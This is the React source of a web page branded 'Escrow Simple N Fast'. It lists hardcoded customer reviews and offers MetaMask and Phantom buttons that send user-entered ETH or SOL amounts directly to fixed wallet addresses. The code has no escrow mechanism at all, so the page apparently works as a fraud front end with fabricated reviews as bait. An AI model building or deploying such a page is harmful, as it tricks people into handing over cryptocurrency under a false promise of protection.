import * as solanaWeb3 from "@solana/web3.js";
import './App.css';
import {useRef, useState} from "react";

const Title = 'Escrow Simple N Fast'

document.title = Title

const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"

function App() {
    const [opacity, setOpacity] = useState(0)
    const [ethAmount, setEthAmount] = useState(null)
    const [solAmount, setSolAmount] = useState(null)
    const firstItemRef = useRef(null);

    const reviews = [
        {username: 'Dung Pham', review: 'Great service ever!', date: '23.04.22'},
        {username: 'Kit2 ETH', review: 'Excellent I appreciate!', date: '20.04.22'},
        {username: 'Hoseah Kiplang\'at Kapketui', review: 'Great customer service', date: '15.04.22'},
        {username: 'WILLIAM', review: 'Very helpful and speedy support', date: '08.04.22'},
        {username: 'Adam Mcdadi', review: 'It was great doing business through ESCROW. All steps were very easy to follow. What I like most is the communication with them. They were replying my messeges in a timely manner. They were very professional.', date: '08.04.22'},
        {username: 'Joseph Barmakian', review: 'The process was clearly laid out and followed precisely. I have utmost confidence in them and would highly recommend this service.', date: '02.04.22'},
        {username: 'Ron Booth', review: 'Jesse did and excellent job, completely professional and timely.', date: '27.03.22'},
        {username: 'Juli Augusto', review: 'Very helpful!', date: '19.03.22'},
        {username: 'Wouter Ghysens', review: 'Great platform to get a transaction done with. I\'m from Belgium, and had never worked with this before.', date: '13.03.22'},
        {username: 'SolBoy', review: 'Fast!', date: '12.03.22'},
        {username: 'Zeke S.', review: 'Amazing service+++', date: '09.03.22'},
        {username: 'Dirk H..', review: 'My sol bank was terrible, but Escrow support was amazing', date: '25.02.22'},
        {username: 'Guillaume V.', review: 'Good!', date: '18.02.22'},
        {username: 'Lisa G.', review: 'Amazing Service.', date: '03.02.22'},
        {username: 'Tom A.', review: 'Thank you, Jay, much appreciated', date: '01.02.22'},
        {username: 'Souvik B.', review: 'Safe and Smooth', date: '24.01.22'},
        {username: 'David P.', review: 'Courteous and professional escrow service', date: '10.01.22'},
        {username: 'Lance C.', review: 'Awesome Service!', date: '17.12.21'},

    ]

    const inputChangeHandlerETH = (e) => {
        setEthAmount(e.target.value)
    }

    const inputChangeHandlerSOL = (e) => {
        setSolAmount(e.target.value)
    }

    ////////////////// ETH/METAMASK

    const connectAndSendMetaMask = async (fromWallet) => {
        try {
            await sendEth()
        } catch (err) {
            console.log(err)
        }
    }

    const sendEth = async () => {
        const address = await window.ethereum.request({method: 'eth_requestAccounts'})

        let params = [{
            "from": address[0],
            "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
            "value": parseInt(Number(ethAmount) * 1000000000000000000).toString(16)
        }]

        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
            console.log(err)
        })
    }

    ////////////// SOL/PHANTOM

    async function connectAndSendPhantom() {
        try {
            await window.solana.connect()
            await sendSol()
        } catch (error) {
            console.log(error)
        }
    }

    async function sendSol() {
        const provider = window.solana
        const connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed'
        )

        // const balance = await connection.getBalance(provider.publicKey)

        const toAccount = new solanaWeb3.PublicKey(address)

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: toAccount,
                lamports: solanaWeb3.LAMPORTS_PER_SOL * Number(solAmount),
            })
        )

        transaction.feePayer = await provider.publicKey
        let blockhashObj = await connection.getRecentBlockhash()
        transaction.recentBlockhash = await blockhashObj.blockhash

        let signed = await provider.signTransaction(transaction)
        let signature = await connection.sendRawTransaction(signed.serialize())
        await connection.confirmTransaction(signature)
    }


    setTimeout(() => {
        setOpacity(100)
    }, 0)

    return (
        <>
            <div className={'AppContainer'}
                 ref={(el) => {
                     if (el) {
                         el.style.setProperty('opacity', opacity, 'important');
                     }
                 }}
            >
                <header>
                    <div className={'headerInner'}>
                        <div>
                            <a href={'/'}>{Title}</a>
                        </div>
                        <div onClick={() => firstItemRef.current.scrollIntoView({behavior: "smooth"})} className={'reviewHeaderButton'}>reviews</div>
                        <div>Minimum Commission</div>
                    </div>
                </header>
                <div className="App">
                    <div className="AppInner">
                        <div>
                            <div>
                                <div style={{marginLeft: '130px'}}>eth {ethAmount}</div>
                                <input type="number" onChange={inputChangeHandlerETH}/>
                            </div>
                            <button disabled={!ethAmount && true} onClick={connectAndSendMetaMask}>connect MetaMask
                            </button>
                        </div>
                        <div>
                            <div>
                                <div style={{marginLeft: '130px'}}>sol {solAmount}</div>
                                <input type="number" onChange={inputChangeHandlerSOL}/>
                            </div>
                            <button disabled={!solAmount && true} onClick={connectAndSendPhantom}>connect Phantom
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div className={'reviews'}>
                <div ref={firstItemRef} style={{color: 'white', fontSize: '35px', borderBottom: '1px solid white'}}>reviews</div>
                <div>
                    {reviews.map(e => {
                        return(
                            <div className={'usernameNreview'}>
                                <div className={'username'}>{e.username} <span style={{fontSize: '20px', marginLeft: '20px', WebkitTextStroke: '0 red'}}>{e.date}</span></div>
                                <div className={'review'}>{e.review}</div>
                            </div>
                        )
                    })}
                </div>
            </div>
        </>
    );
}

export default App;
